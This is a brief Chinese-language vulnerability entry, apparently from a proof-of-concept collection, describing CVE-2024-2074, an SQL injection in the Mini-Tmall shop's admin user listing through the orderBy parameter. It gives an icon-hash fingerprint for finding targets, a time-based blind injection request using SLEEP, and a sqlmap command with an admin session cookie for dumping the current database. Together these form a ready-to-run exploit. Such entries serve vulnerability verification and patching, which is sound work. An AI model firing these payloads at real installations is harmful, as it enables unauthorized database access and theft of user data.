﻿# Mini-Tmall SQL注入漏洞

> 更新时间：2024-03-08

> 漏洞编号：CVE-2024-2074

> 漏洞说明：Mini-Tmall是一个基于Spring Boot的迷你天猫商城。Mini-Tmall在20231017版本及之前存在一个严重的漏洞，攻击者可以利用该漏洞通过远程执行特定操作来注入恶意SQL语句，从而获取敏感信息或控制数据库。此漏洞影响文件?r=tmall/admin/user/1/1的一些未知处理，攻击者可以通过篡改orderBy参数来达成sql注入攻击。攻击者可以通过远程方式发起攻击。

> 漏洞特征：icon_hash="-2087517259"

> 验证脚本：HTTP

```
GET /tmall/admin/user/1/1?orderBy=7,if((length(database())=11),SLEEP(5),0) HTTP/1.1
```

> 响应代码特征：200

> 响应内容特征：

> 上传文件定位：

> 验证文件来源：Mini-Tmall SQL注入漏洞.poc

```
sqlmap -u http://localhost:8080/tmall/admin/user/1/1?orderBy=* --level=5 --current-db --cookie="username=admin; JSESSIONID=56AEDFB42C10096BD3E6CD80398EC94C"

```